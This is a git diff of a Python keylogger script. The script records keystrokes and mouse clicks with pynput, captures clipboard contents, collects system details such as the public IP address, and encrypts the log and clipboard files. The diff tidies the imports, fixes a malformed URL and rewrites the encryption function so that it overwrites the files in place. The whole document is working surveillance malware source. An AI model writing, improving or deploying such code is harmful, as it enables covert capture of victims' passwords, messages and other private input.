@@ -6,13 +6,15 @@ import pyaudio
 import wave
 import win32clipboard
 import time
-import os
+import platform
+import socket
+import re
+import uuid
+import psutil
 
-import platform, socket, re, uuid, json, psutil
 from pynput import keyboard, mouse
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import Key
 from cryptography.fernet import Fernet
-
 
 LOG_FILE = "keylogfile.txt"
 CLIPBOARD = "clipboard.txt"
@@ -31,7 +33,7 @@ def setup_logging():
 def get_system_info():
     info = {}
     try:
-        response = requests.get('\n https://ipinfo.io/ip')
+        response = requests.get('https://ipinfo.io/ip')
         info['Public IP Address'] = response.text.strip()
     except requests.RequestException as e:
         info['Public IP Address'] = f"Unable to get the Public IP Address: {str(e)}"
@@ -114,31 +116,21 @@ def on_click(button, pressed):
             logging.info('[Mouse Click] - Middle Click')
 
 def encrypt(file_path):
-    try:
-        # Load the key from the file
-        with open('keyfile.key', 'rb') as filekey:
-            key = filekey.read()
+    # Load the key from the file
+    with open('keyfile.key', 'rb') as filekey:
+        key = filekey.read()
 
-        # Load the content of the file
-        with open(file_path, 'rb') as inputfile:
-            original = inputfile.read()
+    # Load the content of the file
+    with open(file_path, 'rb') as inputfile:
+        original = inputfile.read()
 
-        # Encrypt the content
-        fernet = Fernet(key)
-        encrypted = fernet.encrypt(original)
+    # Encrypt the content
+    fernet = Fernet(key)
+    encrypted = fernet.encrypt(original)
 
-        # Save the encrypted content to a new file
-        encrypted_file_path = file_path + '.encrypted'
-        while os.path.exists(encrypted_file_path):
-            # Ensure file doesn't already exist
-            encrypted_file_path += "_1"
+    with open(file_path, 'wb') as encrypted_file:
+        encrypted_file.write(encrypted)
 
-        with open(encrypted_file_path, 'wb') as encrypted_file:
-            encrypted_file.write(encrypted)
-
-        return encrypted_file_path
-    except Exception as e:
-        logging.error(f"An error occurred during encryption: {str(e)}")
 
 def main():
     try:
@@ -158,12 +150,12 @@ def main():
             mouse_listener.stop()
 
         # Encrypt the LOG_FILE and CLIPBOARD
-        encrypted_log_file = encrypt(LOG_FILE)
-        encrypted_clipboard = encrypt(CLIPBOARD)
+        encrypt(LOG_FILE)
+        encrypt(CLIPBOARD)
 
         # Print the paths of encrypted files
-        print("Encrypted LOG_FILE:", encrypted_log_file)
-        print("Encrypted CLIPBOARD:", encrypted_clipboard)
+        print("Encrypted LOG_FILE:", LOG_FILE)
+        print("Encrypted CLIPBOARD:", CLIPBOARD)
 
     except Exception as e:
         logging.exception(f"An error occurred: {str(e)}")
